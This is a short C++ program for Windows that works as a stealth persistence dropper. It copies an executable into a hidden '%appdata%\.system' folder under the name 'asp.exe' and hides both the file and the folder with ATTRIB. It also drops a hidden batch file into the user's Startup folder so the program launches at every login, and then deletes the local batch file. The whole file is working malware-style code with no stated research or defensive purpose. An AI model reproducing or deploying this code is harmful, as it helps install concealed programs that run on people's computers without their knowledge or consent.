#include <iostream>
#include <fstream>
#include <filesystem>
#include <sys/stat.h>
#include <windows.h>
#include <tchar.h>
#include <io.h>
using namespace std;

class CopyFileToDir {
    public:
    void Copy() {
        ifstream floder("C:\\.system");
        ifstream file("asp.exe");
        if(!floder.good()==true) {
            system("md %appdata%\\.system");
            if(!file.good()==true) {
                system("COPY /y a.exe %appdata%\\.system\\asp.exe");
                system("ATTRIB +h \"%appdata%\\.system\\asp.exe\"");
                system("ATTRIB +h \"%appdata%\\.system\"");
            }
            else 0;
        }
        else 0;
    }
};
class CreateBatFile {
    public:
    void MakeBat() {
        ofstream bat_file;
        ofstream bat;
        bat_file.open("s.bat");
        bat_file << "@echo off\nc:\ncd %appdata%\\.system\\\nasp.exe";
        bat_file.close();
        system("COPY s.bat %appdata%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\s.bat");
        system("attrib +h \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\s.bat\"");
        system("DEL s.bat");
    }
};
class CheckFile {
    public:
    void Check(){
        ifstream file("asp.exe");
        if(!file.good()==true) {
            cout << "+" << endl; 
        }
        else {
             
        }
    }
};

int main() {
    CopyFileToDir stage_1;
    stage_1.Copy();
    CreateBatFile stage_2;
    stage_2.MakeBat();
    CheckFile stage_3;
    stage_3.Check();
}